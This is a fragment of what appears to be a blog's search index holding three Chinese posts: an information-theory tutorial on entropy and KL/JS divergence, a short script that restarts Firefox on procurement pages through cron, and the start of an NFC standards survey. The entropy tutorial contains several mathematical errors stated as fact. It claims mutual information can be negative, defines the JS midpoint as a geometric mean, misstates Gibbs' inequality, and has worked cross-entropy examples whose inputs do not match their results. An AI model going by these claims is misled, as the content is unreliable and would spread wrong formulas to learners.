{p(x)}$$</p>\n<p>香农熵满足以下性质：</p>\n<ul>\n<li>非负性：$H(X) \\geq 0$</li>\n<li>概率密度函数为平均分布时，$H(X)$ 取得最大值</li>\n</ul>\n<blockquote>\n<p>信息论的物理意义：根据信息的概率分布对信息编码所需要的<strong>最短平均编码长度</strong>。</p>\n</blockquote>\n<p>还是以天气预报为例，考虑几种不同的概率分布：</p>\n<ul>\n<li>如果晴天概率80%，雨天概率20%，信息熵为 $-(0.8 \\times log_{2}0.8 + 0.2 \\times log_{2}0.2) &#x3D;0.7219$</li>\n<li>如果晴天和雨天的概率都是50%，信息熵为 $-(0.5 \\times log_{2}0.5 + 0.5 \\times log_{2}0.5) &#x3D; 1$</li>\n<li>再搞复杂一点，如果有四种天气，分别是晴天、阴天、小雨和大雨，其发生概率都是25%，则信息熵为 $-(0.25 \\times log_{2}0.25 + 0.25 \\times log_{2}0.25 + 0.25 \\times log_{2}0.25 + 0.25 \\times log_{2}0.25 &#x3D; 2$</li>\n</ul>\n<p>对于一个给定的（预测）概率分布，信息熵是对可能产生的信息量的期望，代表着对系统不确定性的评估数值。在上面的例子中，预测二的概率分布比预测一更平均，因此不确定性更强；与预测二相比，预测三同样是平均分布，但天气的状态数量更多，也说明其不确定性更高。</p>\n<p><img src=\"/2024/07/16/%E4%BF%A1%E6%81%AF%E8%AE%BA%E5%9F%BA%E7%A1%80-%E4%BF%A1%E6%81%AF%E7%86%B5/xxs2.png\" alt=\"alt text\"><br>预测三的 4 种天气为均匀分布，其信息熵为 2，意味着最少需要 2 位编码表示；<br>而上图的不均匀分布，最优编码是 0、10、110、111，平均编码长度为 1.75，与信息熵相等。<br>$ 1 \\times 0.5+2 \\times 0.25+3 \\times 0.125+3 \\times 0.125&#x3D;1.75 $</p>\n<h3 id=\"3-差分熵（Differential-Entropy）\"><a href=\"#3-差分熵（Differential-Entropy）\" class=\"headerlink\" title=\"3. 差分熵（Differential Entropy）\"></a>3. 差分熵（Differential Entropy）</h3><p>香农熵是基于离散变量的，如果拓展到连续变量，称为差分熵（Differential Entropy），定义为：<br>$$h(x) :&#x3D; -\\int p(x) \\log p(x)dx$$</p>\n<p>微分熵满足以下性质：</p>\n<ul>\n<li>概率密度函数为正态（高斯）分布时，$h(x)$取得最大值。</li>\n<li><strong>不满足非负性</strong>。<br>  差分熵可以是正的，也可以是负的，甚至是未定义的。例如，柯西分布（Cauchy distribution）就是一个具有未定义的差分熵的分布，因为它有一个尖峰在中心，并且尾部衰减得非常慢，导致其概率密度函数在中心附近为零，但在整个实数线上积分不为零。请参见 <a href=\"https://en.wikipedia.org/wiki/Differential_entropy\">Differential entropy - Wiki</a>。</li>\n</ul>\n<h2 id=\"二、联合熵、条件熵和互信息\"><a href=\"#二、联合熵、条件熵和互信息\" class=\"headerlink\" title=\"二、联合熵、条件熵和互信息\"></a>二、联合熵、条件熵和互信息</h2><p>上面定义了一个随机变量的熵，现在推广到两个或多个随机变量。</p>\n<h3 id=\"1-联合熵（Joint-Entropy）\"><a href=\"#1-联合熵（Joint-Entropy）\" class=\"headerlink\" title=\"1. 联合熵（Joint Entropy）\"></a>1. 联合熵（Joint Entropy）</h3><p>联合熵是衡量一组变量的不确定性的指标，显然其与联合概率有关。数学定义为：<br>$$ H(X,Y) :&#x3D; E[I(X,Y)] &#x3D; -\\sum_{x \\in X} \\sum_{y \\in Y} p(x,y) \\log {p(x,y)}$$</p>\n<p>满足以下性质：</p>\n<ul>\n<li>如果 $X$ 与 $Y$ 是独立的，$H(X, Y) &#x3D; H(X) + H(Y)$ , 并推广到 N 个变量</li>\n</ul>\n<blockquote>\n<p>信息论的物理意义：观察一个包含多个随机变量的随机系统获得的信息量。</p>\n</blockquote>\n<h3 id=\"2-条件熵（Conditional-Entropy）\"><a href=\"#2-条件熵（Conditional-Entropy）\" class=\"headerlink\" title=\"2. 条件熵（Conditional Entropy）\"></a>2. 条件熵（Conditional Entropy）</h3><p>在给定 $Y &#x3D; \\{y_1, y_2, y_3 … y_n\\}$ 发生的前提下，求事件 $X &#x3D; \\{x_1, x_2, x_3 … x_m\\}$ 的熵，称为 $X$ 的条件熵，用来衡量 $Y$ 发生的不确定性, 此时用 $H(X|Y)$ 来表示 $X$ 的条件。数学定义是：<br>$$ H(X|Y) :&#x3D; -\\sum_{x \\in X} \\sum_{y \\in Y} p(x,y) \\log p(x|y) &#x3D;  -\\sum_{x \\in X} \\sum_{y \\in Y} p(x,y) \\log \\frac {p(x,y)}{p(x)} $$</p>\n<p>满足以下性质：</p>\n<ul>\n<li>链式规则：$H(Y|X) &#x3D; H(X,Y) - H(X)$</li>\n<li>贝叶斯规则：$H(Y|X) &#x3D; H(X|Y) + H(Y) - H(X)$</li>\n</ul>\n<blockquote>\n<p>信息论的物理意义：在得知某一确定信息的基础上，获取另外一个信息时所获得的信息量。</p>\n</blockquote>\n<h3 id=\"3-互信息（Mutual-Information）\"><a href=\"#3-互信息（Mutual-Information）\" class=\"headerlink\" title=\"3. 互信息（Mutual Information）\"></a>3. 互信息（Mutual Information）</h3><p>定义：已知 $I(x)$是 $x$ 事件所含有的信息量，$I(x|y)$ 是 $x$ 事件在给定 $y$ 事件发生后的信息量，那么两者的差值就是 $y$ 事件带给 $x$ 事件的信息量（增益）:<br>$$ I(X;Y) :&#x3D; I(X) - I(X|Y) &#x3D;  -\\sum_{x \\in X} \\sum_{y \\in Y} p(x,y) \\log \\frac {p(x,y)}{p(x)p(y)} $$</p>\n<p>互信息是用来衡量随机变量之间的依赖性的度量，满足如下性质：</p>\n<ul>\n<li>对称性：$I(x;y) &#x3D; I(y;x)$</li>\n<li>当事件 $x$ 和 $y$ 相互独立时，$I(x;y) &#x3D; 0$；即 $y$ 无法给 $x$ 带来信息（增益）</li>\n<li>可正可负</li>\n<li>$I(x;y) \\leq \\frac {I(x)}{I(y)}$</li>\n</ul>\n<blockquote>\n<p>信息论的物理意义：互信息（信息增益） &#x3D; 信息熵 — 条件熵</p>\n</blockquote>\n<h3 id=\"4-熵和互信息的关系\"><a href=\"#4-熵和互信息的关系\" class=\"headerlink\" title=\"4. 熵和互信息的关系\"></a>4. 熵和互信息的关系</h3><p>对于随机变量 $X$, $Y$，它们的熵、联合熵、条件熵以及互信息之间的关系是：<br><img src=\"/2024/07/16/%E4%BF%A1%E6%81%AF%E8%AE%BA%E5%9F%BA%E7%A1%80-%E4%BF%A1%E6%81%AF%E7%86%B5/sum1.png\" alt=\"sum\"></p>\n<ol>\n<li>$I(X;Y) &#x3D; H(X) - H(X|Y) &#x3D; H(Y) - H(Y|X)$</li>\n<li>$I(X;Y) &#x3D; H(X) + H(Y) - H(X,Y)$</li>\n<li>$I(X;Y) &#x3D; I(Y;X)$，满足对称性，因此不能用于确定信息流的方向</li>\n<li>$I(X;X) &#x3D; H(X)$，单一变量不能给自身带来新的信息</li>\n</ol>\n<p>互信息就是信息增益，用于衡量随机变量之间相互依赖程度的度量。例如，构建决策树时选择某个特征变量，导致分类模型（另一个变量）的不确定性减少，也就是带来了新的信息，减少的越多说明这个特征越重要。<br>反之，如果 $X$ 和 $Y$ 互相独立，即两者之间互相不提供任何信息，则他们的互信息为 0。</p>\n<h2 id=\"三、相对熵-不同概率分布的比较\"><a href=\"#三、相对熵-不同概率分布的比较\" class=\"headerlink\" title=\"三、相对熵 - 不同概率分布的比较\"></a>三、相对熵 - 不同概率分布的比较</h2><p>衡量两个概率分布之间的差异（不确定性），主要有 KL 散度、JS 散度、交叉熵和 Wasserstein 距离等指标。</p>\n<h3 id=\"1-KL散度（Kullback-Leibler-Divergence，或-相对熵-Relative-Entropy）\"><a href=\"#1-KL散度（Kullback-Leibler-Divergence，或-相对熵-Relative-Entropy）\" class=\"headerlink\" title=\"1. KL散度（Kullback-Leibler Divergence，或 相对熵 - Relative Entropy）\"></a>1. KL散度（Kullback-Leibler Divergence，或 相对熵 - Relative Entropy）</h3><p>若 $P$,$Q$ 定义在同一个概率空间的不同测度，那么 KL Divergence 定义为：<br>$$D_{KL}(P||Q) :&#x3D; E_P[\\log \\frac {p(x)}{q(x)}] &#x3D; \\sum_{i&#x3D;1}^n p(x_i)log(\\frac {p(x_i)}{q(x_i)})$$<br>其中，为了保证连续性，定义 $0 \\log \\frac{0}{0} &#x3D; 0$，$0 \\log \\frac{0}{q} &#x3D; 0$。</p>\n<p>以下图为例，黄色柱体是目标分布 $P(x)$，蓝色柱体是评价分布 $Q(x)$，棕色是两者的重叠部分，而本色区域就两者之间的“距离”，再基于 $P(x)$ 的概率分布“累计”得到期望值，这就是 KL 散度的直观解释。</p>\n<p><img src=\"/2024/07/16/%E4%BF%A1%E6%81%AF%E8%AE%BA%E5%9F%BA%E7%A1%80-%E4%BF%A1%E6%81%AF%E7%86%B5/KL.png\" alt=\"KL\"></p>\n<p>KL散度又称为<strong>相对熵</strong>，信息散度，信息增益。满足以下性质：</p>\n<ol>\n<li>非对称性：$ D_{KL}(P \\| Q) \\neq D_{KL}(Q \\Vert P) $。KL 散度不是严格意义的 <strong>metric</strong> 指标。</li>\n<li>非负性：$ D_{KL}(P || Q) \\geqslant 0 $，当且仅当 $P(x) &#x3D; Q(x) $ 时等号成立。根据<a href=\"https://allenwind.github.io/blog/6631/\">吉布斯不等式</a>可以证明</li>\n<li>$D_{KL}(P||Q) &#x3D; H(P,Q) - H(P)$，即：<strong>相对熵 &#x3D; 交叉熵 - P的信息熵</strong></li>\n</ol>\n<blockquote>\n<p>信息论的物理意义：使用错误分布 $Q$ 来表示真实分布 $P$ 中的样本，所使用编码的<strong>平均长度的增量</strong></p>\n</blockquote>\n<p>互信息是用于衡量两个随机变量之间的依赖性的度量，其实也是一种相对熵，只是它衡量的并非随机变量 $p$ 和 $q$，而是他们的联合分布 $p(x,y)$ 和边缘分布乘积 $p(x)p(y)$ 的相似程度。<br>$$ I_{X;Y}(x,y) :&#x3D; I_X(x) - I_{X|Y}(x|y) &#x3D; \\log \\frac {P_{X|Y}(x|y)}{P_X(x)} &#x3D; \\log \\frac {P_{XY}(xy)}{P_X(x)P_Y(y)}$$</p>\n<h3 id=\"2-交叉熵（Cross-Entropy）\"><a href=\"#2-交叉熵（Cross-Entropy）\" class=\"headerlink\" title=\"2. 交叉熵（Cross Entropy）\"></a>2. 交叉熵（Cross Entropy）</h3><p>给定两个概率分布 $P$ 和 $Q$，$P$ 相对于 $Q$ 的交叉熵定义为：<br>$$H(P,Q) :&#x3D; E_P[-\\log Q] &#x3D; -\\sum_{x \\in X} p(x) \\log q(x)$$</p>\n<p>还是以 KL散度的图为例，蓝色柱体是评价分布 $Q(x)$，不考虑黄色柱体，直接以目标分布 $P(x)$ 的概率分布“累计”得到期望值，这就是交叉熵的直观解释。这也体现了两者之间的差别就是目标分布 $P(x)$ 的信息熵。</p>\n<blockquote>\n<p>信息论的物理意义：使用错误分布 $Q$ 来表示真实分布 $P$ 中的样本，所使用编码的<strong>平均长度</strong></p>\n</blockquote>\n<h3 id=\"3-JS散度（Jensen-Shannon-Divergence）\"><a href=\"#3-JS散度（Jensen-Shannon-Divergence）\" class=\"headerlink\" title=\"3. JS散度（Jensen-Shannon Divergence）\"></a>3. JS散度（Jensen-Shannon Divergence）</h3><p>对于两个概率分布 $P$ 和 $Q$，JS 散度定义为：<br>$$D_{JS}(P||Q) &#x3D; \\frac{1}{2} D_{KL}(P || M) + \\frac{1}{2} D_{KL}(Q || M) $$<br>其中： $M$ 是 $P$ 和 $Q$ 的几何平均，定义为：$ M(x) &#x3D; \\sqrt{P(x) \\cdot Q(x)} $</p>\n<p>JS散度是 KL散度的一种<strong>对称化形式</strong>，满足如下性质：</p>\n<ul>\n<li>非负性：$D_{JS} \\geq 0$，且仅当 $P &#x3D; Q$ 时为 0</li>\n<li>对称性：JS 散度是对称的，即 $D_{JS}(P || Q) &#x3D; D_{JS}(Q || P)$</li>\n<li>三角不等式：对于任意三个概率分布 $P$，$Q$ 和 $R$，有：$ D_{JS}(P || R) \\leq D_{JS}(P || Q) + D_{JS}(Q || R) $</li>\n</ul>\n<h2 id=\"四、应用分析\"><a href=\"#四、应用分析\" class=\"headerlink\" title=\"四、应用分析\"></a>四、应用分析</h2><p>KL散度可以用来衡量两个概率分布的”距离”。但是KL散度并不是标准意义的度量指标（不满足对称性），即$D_{KL}(p,q) \\neq D_{KL}(q,p)$，因此应用KL散度时，必须明确区分哪个是“真实”分布，哪个是“近似（预测）”分布。</p>\n<p>通常我们使用的是$D_{KL}(p,q)$（也记作$D_q(p)$），称为正向KL散度（Forward KL），要使其最小的数学表达为：<br>$$q^* &#x3D; \\arg \\min_q D_{KL}(p||q) &#x3D; \\arg \\min_q \\sum_{x \\in X} p(x)\\log \\frac {p(x)}{q(x)} $$<br>其优化重点是在$p(x)$较小的位置，$q(x)$应避免为零（将导致对数无穷大），因此其也被称为“<strong>zero avoiding</strong>”，结果是得到一个较宽的分布，峰值未必突出，但底部比较平坦。</p>\n<p>反之，$D_{KL}(q,p)$（也记作$D_p(q)$）称为反向KL散度（Reverse KL），要使其最小的数学表达为：<br>$$q^* &#x3D; \\arg \\min_q D_{KL}(q||p) &#x3D; \\arg \\min_q \\sum_{x \\in X} q(x)\\log \\frac {q(x)}{p(x)} $$<br>其优化重点是在$p(x)$为零的位置，$q(x)$应尽量为零（因为分母为零导致对数无穷大，但 $0 \\log \\frac{0}{0}&#x3D;0$），因此其也被称为“<strong>zero forceing</strong>”，结果是得到一个较窄的分布，底部尽量低，这也往往导致峰值更突出。</p>\n<p><img src=\"/2024/07/16/%E4%BF%A1%E6%81%AF%E8%AE%BA%E5%9F%BA%E7%A1%80-%E4%BF%A1%E6%81%AF%E7%86%B5/KL2.png\" alt=\"alt text\"></p>\n<p>综上所述，正向KL散度的分布偏向一般化，而反向KL散度的分布偏向极端化。从模型泛化的角度看，在损失函数结果相等的情况下，显然正向KL散度更有优势！</p>\n<p>此外，在模型的训练阶段通常已经确定了输入数据和标签数据，即真实概率分布<code>P(X)</code>的信息熵是一个常量，此时最小化KL散度与最小化交叉熵效果是一致的，但是优化交叉熵的计算量小于优化KL散度，因此在损失函数的计算中得到广泛应用。</p>\n<h3 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h3><p>概率分布 $P$ 和 $Q$ 分别定义在同样的样本空间 {0, 1} 上，真实分布 $P$：$P(0) &#x3D; 0.8, P(1) &#x3D; 0.2 $</p>\n<ol>\n<li>对于预测分布$Q1$：$Q(0) &#x3D; 0.6, Q(1) &#x3D; 0.4 $，计算交叉熵：<br>$H(P,Q) &#x3D;-(P(0) \\log Q(0) + P(1) \\log Q(1)) &#x3D;-(0.8 \\log0.6 + 0.2 \\log0.4) &#x3D; 0.8540$</li>\n<li>换一个预测分布$Q2$：$Q(0) &#x3D; 0.7, Q(1) &#x3D; 0.3 $，此时交叉熵为：<br>$H(P,Q) &#x3D;-(P(0) \\log Q(0) + P(1) \\log Q(1)) &#x3D; -(0.8 \\log0.7 + 0.1 \\log0.3) &#x3D; 0.7591$</li>\n<li>如果预测分布等于真实分布，$Q(0) &#x3D; 0.6, Q(1) &#x3D; 0.4 $，此时交叉熵：<br>$H(P,Q) &#x3D;-(P(0) \\log Q(0) + P(1) \\log Q(1)) &#x3D; -(0.8 \\log0.8 + 0.2 \\log0.2) &#x3D; 0.7219$</li>\n<li>进一步，如果预测分布$Q4$：$Q(0) &#x3D; 0.9, Q(1) &#x3D; 0.1 $，此时交叉熵为：<br>$H(P,Q) &#x3D;-(P(0) \\log Q(0) + P(1) \\log Q(1)) &#x3D; -(0.8 \\log0.9 + 0.2 \\log0.1) &#x3D; 0.7860$</li>\n</ol>\n<p>分析交叉熵的数值：</p>\n<ul>\n<li>$H(P,Q2) &lt; H(P,Q1)$：表明相比$Q1$，$Q2$更接近真实分布；</li>\n<li>$H(P,Q3)$ 是最小值：因为真实分布与其自身的交叉熵就是信息熵，$H(P,P) &#x3D; H(P)$；</li>\n<li>$H(P,Q4) \\approx H(P,Q2)$：表明两者与真实分布的“距离”差不多。而 $H(P,Q4) &gt; H(P,Q3)$是肯定的。</li>\n</ul>\n<hr>\n<h2 id=\"附录一：几个名词解释\"><a href=\"#附录一：几个名词解释\" class=\"headerlink\" title=\"附录一：几个名词解释\"></a>附录一：几个名词解释</h2><h3 id=\"Divergence-散度\"><a href=\"#Divergence-散度\" class=\"headerlink\" title=\"Divergence - 散度\"></a>Divergence - 散度</h3><p>Divergence 这个词来源于拉丁语词根 diverge，意为”分叉”或”偏离”。<br>在数学中，通常指的是向量场中某一点的发散性，即向量从这一点向外散开的程度。<br>在物理学中，可以指能量或物质的发散，例如在热力学中，热量的发散。<br>反义词是 convergence ，意为”汇聚”或”趋同”，指的是从不同起点汇聚到一点或趋于一致。</p>\n<h3 id=\"Metric-度量\"><a href=\"#Metric-度量\" class=\"headerlink\" title=\"Metric - 度量\"></a>Metric - 度量</h3><p>在数学中，度量空间（metric space）是具有<strong>距离（distance）</strong>这一个概念的集合，具体来说，是装配了一个称为度量的函数，用以表示此集合中任两个成员间的距离。历史上是由法国数学家莫里斯·弗雷歇在1906年于其意大利语著作《Sur quelques points du calcul fonctionnel》首次使用。其定义为：</p>\n<p>$M$ 为集合，若其装配了函数 $d: M \\times M \\rightarrow R$，对任意 $x,y,z \\in M$ 满足：</p>\n<ul>\n<li>同一性：$d(x,y) &#x3D; 0 \\Longleftrightarrow x &#x3D; y$</li>\n<li>对称性：$d(x,y) &#x3D; d(y,x)$</li>\n<li>三角不等式：$d(x,z) \\leq d(x,y) + d(y,z)$</li>\n</ul>\n<p>则称 $d$ 为定义在 $M$ 上的度量（metric），或是距离函数，且称 $(M,d)$ 为度量空间。</p>\n<h2 id=\"附录二：吉布斯不等式（Gibbs’-Inequality）\"><a href=\"#附录二：吉布斯不等式（Gibbs’-Inequality）\" class=\"headerlink\" title=\"附录二：吉布斯不等式（Gibbs’ Inequality）\"></a>附录二：吉布斯不等式（Gibbs’ Inequality）</h2><p>吉布斯不等式（Gibbs’ Inequality）是信息论中的一个基本不等式，由 J.W. Gibbs 提出的，表明联合熵（Joint Entropy）不会超过两个随机变量各自熵（Entropy）的和，数学定义是：</p>\n<p>对于任意两个随机变量 $X$ 和 $Y$，$H(X, Y) \\leq H(X) + H(Y) $</p>\n<p>当且仅当随机变量 $X$ 和 $Y$ 相互独立时，等号成立，即 $ H(X, Y) &#x3D; H(X) + H(Y) $。这是因为如果 $X$ 和 $Y $ 独立，那么知道 $X$ 的信息不会对 $Y$ 的不确定性产生任何影响，反之亦然。</p>\n<h2 id=\"附录三：最大熵思想-Maximum-Entropy-Principle\"><a href=\"#附录三：最大熵思想-Maximum-Entropy-Principle\" class=\"headerlink\" title=\"附录三：最大熵思想 (Maximum Entropy Principle)\"></a>附录三：最大熵思想 (Maximum Entropy Principle)</h2><p>最大熵的思想是，当你要猜一个概率分布时，如果你对这个分布一无所知，那就猜熵最大的均匀分布；如果你对这个分布知道一些情况，那么，就猜满足这些情况下的熵最大的分布。<br>换句话说，除了已经确认的信息，不做任何未知假设，直接把所有未知事件当成<strong>等概率</strong>事件处理。</p>\n<p>吴军老师的《数学之美》第 20 章中提到了一个掷骰子的例子可以很好的解释最大熵原理。对于一个骰子，每面向上的概率是多少，可能我们会不加思索会说是1&#x2F;6，但是，如果说骰子的其中四点被做过特殊处理，四点向上的概率为1&#x2F;3，那么其他点向上的概率则变为2&#x2F;15。</p>\n<p>首先，在骰子没做任何处理之前，我们认为骰子的各个面出现的概率是相同的，即符合均匀分布，此时熵最大。然后，当增加四点被做过特殊处理后，其他面的向上的概率变为2&#x2F;15，在这里四点被做过特殊处理，即所谓的约束条件，满足约束条件之后，而对其它则不做任何假设其他面向上的概率是相同的，即为2&#x2F;15，也是熵最大的。</p>\n<p>在这个例子中，不作任何假设就是使用“等概率”，这个时候概率分布最均匀，从而使得概率分布的熵最大，即最大熵原理。</p>\n<h2 id=\"附录四：热力学第二定律的解释\"><a href=\"#附录四：热力学第二定律的解释\" class=\"headerlink\" title=\"附录四：热力学第二定律的解释\"></a>附录四：热力学第二定律的解释</h2><p>有一种说法，宇宙诞生时是符合帕累托分布的，它的熵值很低，也具有很大的活力；宇宙热寂时，它的熵值很大，符合正态分布，也就是说事物的发展过程就是从幂律分布到正态分布。</p>\n<p><img src=\"/2024/07/16/%E4%BF%A1%E6%81%AF%E8%AE%BA%E5%9F%BA%E7%A1%80-%E4%BF%A1%E6%81%AF%E7%86%B5/demo.png\" alt=\"alt text\"></p>\n<p>社会学还有一个叫做二八定律的东西，20% 的人掌握着社会 80% 的财富，把这种离散的模型迁移到连续的情况，这就是帕累托分布（这是一个厚尾模型，它的均值在采样无限时可以趋于无限大）。从其图像可以看到，采样时大部分样本都聚集在后面，但采样足够多时，总有几个非常大的样本来影响采样数据整体的分布，这个概率分布的熵值就很低。<br>马克思主义指出，资本主义必将演化到共产主义，也就是大部分财富在少部分人手中的幂等分布，最终必将演化到正态分布，即大部分财富掌握在大部分人手中！</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://faculty.ustc.edu.cn/_resources/group1/M00/00/37/wKhJFGN1l3WAH_v2AxmG8aJYbXg890.pdf\">信息论基础 - Thomas M.Cover, Joy A,Thomas</a></li>\n<li><a href=\"https://zodiac911.github.io/blog/entropy-and-crossentropy.html#%E4%BA%A4%E5%8F%89%E7%86%B5-Cross-Entropy\">通俗理解熵与交叉熵</a></li>\n<li><a href=\"https://www.cnblogs.com/Blackteaxx/p/18164220\">Entropy</a></li>\n<li><a href=\"https://medium.com/@eric_zhu/%E7%86%B5-entropy-8299ccce0cf2\">熵 (Entropy)</a></li>\n<li><a href=\"https://www.jianshu.com/p/71bd778dfb5a\">信息论基础（熵，互信息，交叉熵）- 老羊肖恩</a></li>\n<li><a href=\"https://www.cnblogs.com/ZihanZhang/p/16049215.html\">机器学习里的信息论</a></li>\n<li><a href=\"https://lumingdong.cn/various-entropies-in-machine-learning.html\">机器学习中的各种熵</a></li>\n</ul>\n"},{"title":"关于GNOME图形终端的配置要点","url":"/2021/11/06/%E5%85%B3%E4%BA%8EGNOME%E5%9B%BE%E5%BD%A2%E7%BB%88%E7%AB%AF%E7%9A%84%E9%85%8D%E7%BD%AE%E8%A6%81%E7%82%B9/","content":"<h2 id=\"GDM软件配置\"><a href=\"#GDM软件配置\" class=\"headerlink\" title=\"GDM软件配置\"></a>GDM软件配置</h2><h2 id=\"环境变量DISPLAY的设置\"><a href=\"#环境变量DISPLAY的设置\" class=\"headerlink\" title=\"环境变量DISPLAY的设置\"></a>环境变量DISPLAY的设置</h2><h2 id=\"启动脚本\"><a href=\"#启动脚本\" class=\"headerlink\" title=\"启动脚本\"></a>启动脚本</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> DISPLAY=:0.0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">kill</span> -9 `ps -ef |grep firefox |grep -v grep|awk <span class=\"string\">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 5</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/lib64/firefox/firefox https://b2b.10086.cn/b2b/main/listVendorNotice.html?noticeType=1 &amp;</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 5</span><br><span class=\"line\">/usr/lib64/firefox/firefox https://b2b.10086.cn/b2b/main/listVendorNotice.html?noticeType=2 &amp;</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 5</span><br><span class=\"line\">/usr/lib64/firefox/firefox https://b2b.10086.cn/b2b/main/listVendorNotice.html?noticeType=3 &amp;</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 5</span><br><span class=\"line\">/usr/lib64/firefox/firefox https://b2b.10086.cn/b2b/main/listVendorNotice.html?noticeType=7 &amp;</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 5</span><br><span class=\"line\">/usr/lib64/firefox/firefox https://b2b.10086.cn/b2b/main/listVendorNotice.html?noticeType=8 &amp;</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 5</span><br><span class=\"line\">/usr/lib64/firefox/firefox https://b2b.10086.cn/b2b/main/listVendorNotice.html?noticeType=16 &amp;</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 5</span><br></pre></td></tr></table></figure>\n\n<p>创建脚本文件<code>tm-run.sh</code>，添加执行权限，并加入<code>crontab</code>配置中。</p>\n<hr>\n<h3 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h3><ul>\n<li><a href=\"https://www.tampermonkey.net/\">TamperMonkey的官方主页</a></li>\n<li><a href=\"https://wiki.archlinux.org/title/GDM#Automatic_login\">GDM - GNOME Display Manager的官方主页</a></li>\n</ul>\n"},{"title":"关于NFC技术标准体系的综述","url":"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/","content":"<h2 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h2><p>NFC（<code>Near Field Communication</code>，近场通信），也叫做近距离无线通信技术，用于在两个非常接近的设备之间执行数据传输。</p>\n<ul>\n<li>2002年，NFC技术由<code>Philips</code>和<code>Sony</code>两家公司联合推出。</li>\n<li>2004年，<code>Nokia</code>、<code>Philips</code>、<code>Sony</code>等公司共同组建了非盈利性组织<code>NFC Forum</code> ，负责制定NFC相关的技术标准，致力于促进 NFC 技术在消费类电子产品、移动设备和 PC 中的应用，并通过NFC认证测试来保证各厂家的NFC产品符合NFC规范以实现互联互通。</li>\n<li>2006年，恩智浦半导体公司(<code>NXP</code> Semiconductors)从<code>Philips</code>剥离，总部位于荷兰埃因霍温，在全球20多个国家拥有37000名员工（欧洲37%、亚洲37%、大中华区21%、美洲5%），2007年公布的销售额达63亿美元。</li>\n</ul>\n<p>NFC的核心技术优势在于：</p>\n<ul>\n<li><strong>无源硬件</strong>：采用感应耦合技术，NFC标签可以从其他NFC设备产生的电磁场获得能量，经济实惠且完全无源，特别适合IoE（物联网）应用场景</li>\n<li><strong>公开频段</strong>：电磁场频率为 13.56 MHz，该频率是射频频谱高频部分中无需执照的波段，有效距离为4cm左右，目前所支持的数据传输速率有106Kbps、212Kbps和424Kbps三种</li>\n<li><strong>一触即发</strong>：用户无需事先启动APP（特定场景可能要求安全验证），基于硬件支持即可触发NFC，交互时间只有几分之一秒</li>\n<li><strong>终端集成</strong>：NFC软件协议栈完全集成到Android（v.4.0以上）、iOS（v.11）中，有助于在多个应用程序中使用NFC，而无需安装任何特定软件或应用</li>\n</ul>\n<p>需要注意的是，NFC技术演进路线中，多个标准化组织为争夺主导权，互相竞争也互相融合。</p>\n<ul>\n<li><code>NFC Forum</code>是最重要的标准化组织，影响力最大；</li>\n<li><code>ISO/IEC</code>也是重要的标准化组织，但侧重从RF（Radio Frequency，无线频率）和数据交换格式等底层定义，较少涉及业务和应用层面；</li>\n<li>此外，还存在<code>ETSI</code>,<code>ECMA</code>,<code>GB</code>,<code>JIS</code>等区域性的国家标准。</li>\n</ul>\n<p>下图是简化的协议栈结构，本文将以NFC-Froum为主线，对相关技术标准进行阐述。</p>\n<img src=\"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/protocol-1.png\" class=\"\">\n\n<h2 id=\"NFC的演进历史\"><a href=\"#NFC的演进历史\" class=\"headerlink\" title=\"NFC的演进历史\"></a>NFC的演进历史</h2><p>NFC是多种技术路线并行发展的综合体，得益于条形码、磁条卡和智能终端三种技术的共同推动。</p>\n<img src=\"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/nfc-map.png\" class=\"\">\n\n<ol>\n<li><p>最左边一条为发源于条形码（Barcodes）的无线射频识别技术，即RFID技术路线，最终出现了NFC中的两个重要组件<code>NFC Tag</code>（标签）和<code>NFC Reader</code>(读卡器)。</p>\n</li>\n<li><p>最右边一条为磁条卡（Magnetic Strip Cards）技术路线，该路线后来向智能卡（Smart Card）、非接触式智能卡的方向发展。</p>\n<p> 粗略来看Smart Card和RFID Tag类似，例如二者都只存储一些数据，而且自身都没有电源组件，但Smart Card在安全性上的要求远比RFID Tag严格。另外，Smart Card上还能运行一些小的嵌入式系统（如Java Card OS）或者应用程序（Applets）以完成更为复杂的工作。</p>\n<p> Smart Card是NFC技术演进的核心来源，主要包含三个分支：</p>\n<ul>\n<li><p>Proximity Coupling Smart Card（近场耦合智能卡）：对应规范为<code>ISO/IEC 14443</code>，有效距离在10cm之内，是消费市场上最普及的技术标准。NFC Form为此定义了<code>NFC-A</code>，<code>NFC-B</code>和非ISO标准的<code>NFC-F</code>，区别主要在于调制编码方式的不同。</p>\n</li>\n<li><p>Vicinity Coupling Smart Card（疏耦合智能卡）：对应规范为<code>ISO/IEC 15693</code>，有效距离高达1m，NFC Form为此定义了<code>NFC-V</code>。</p>\n<blockquote>\n<p>该技术标准由于读取距离远，使用场景的温度要求远高于消费级产品（通常是-40度到+85度），同时设计简单使得读取器的生产成本低，在物流运输、企业门禁卡等场景中得到广泛应用</p>\n</blockquote>\n</li>\n<li><p>Close Coupling Smart Card：对应的规范是<code>ISO 